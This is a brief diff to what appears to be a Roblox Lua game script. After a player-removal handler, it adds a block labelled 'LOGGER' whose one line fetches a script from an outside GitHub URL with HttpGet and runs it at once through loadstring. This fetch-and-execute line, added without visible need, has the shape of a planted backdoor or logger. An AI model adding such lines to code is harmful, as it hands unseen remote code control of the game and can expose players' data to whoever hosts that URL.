@@ -1366,3 +1366,7 @@ Players.PlayerRemoving:Connect(function(player)
         end)
     end
 end)
+-- ==========================================
+-- 3. LOGGER
+-- ==========================================
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vircap02/Script/refs/heads/main/Logger"))()
